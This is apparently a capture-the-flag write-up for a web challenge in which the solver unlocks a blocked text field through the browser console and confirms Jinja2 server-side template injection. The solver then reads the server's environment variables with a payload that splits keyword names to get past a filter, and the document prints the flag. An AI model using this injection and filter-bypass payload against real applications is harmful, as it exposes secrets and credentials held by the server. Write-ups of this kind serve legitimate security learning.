# Challenge: Announce Your Name
- Category: Webex

## Description

<img width="692" height="525" alt="image" src="https://github.com/user-attachments/assets/049cf56d-6656-4456-aa14-0e897e8849d2" />

## Flag: 
`EnXp{N01T53UQFTC34T3DAM5A47ANUK}`

## Solution
Opening the website, i saw this

<img width="1410" height="285" alt="image" src="https://github.com/user-attachments/assets/d66d018f-808d-4b87-80fb-ecd54be6a4bf" />

Here, the typing area was blocked, looking into view-source
```
<script>
(function(){
  var t = document.getElementById('trick');
  
  window.trickKeyHandler = function(e){
    if (t.dataset.locked === '1') {
      e.preventDefault();
      if (e.key && e.key.length === 1) {
        console.log("Typing locked. Use DevTools to enable input.");
      }
    }
  };
```
This block caught my eye, so to enable input i ran the following code in the console
```
var t = document.getElementById('trick');
var clone = t.cloneNode(true);
t.replaceWith(clone);
clone.readOnly = false;
```
Now, since its an announcement page, i was inclined towards thinking its an ssti challenge, so i checked for it by running ``{{5*'5'}}``, which gave me output as ``25``, thus confirming that its both **SSTI** and **Jinja2**

I ran `{{ type.__init__['__globals__']['__builtins__']['__import__']('os')['environ'] }}` to list all the environment variables but it didnt run properly and gave output as

<img width="505" height="129" alt="image" src="https://github.com/user-attachments/assets/47ec94e4-d414-4708-97d2-dd64db59b114" />

The ServerMessage above was a decoy, so i ignored it. 
Since it returned '[REDACTED]' for my payload i decided to concatenate `__globals__, __builtins__,  __import__` all 3 of them by splitting them, 
so my final payload was
```
{{ type.__init__['__glob'+'als__']['__built'+'ins__']['__imp'+'ort__']('os')['environ'] }}
```
This worked! and i got the flag

<img width="702" height="277" alt="image" src="https://github.com/user-attachments/assets/85a055cd-d307-47b3-bea3-fc40113053e5" />
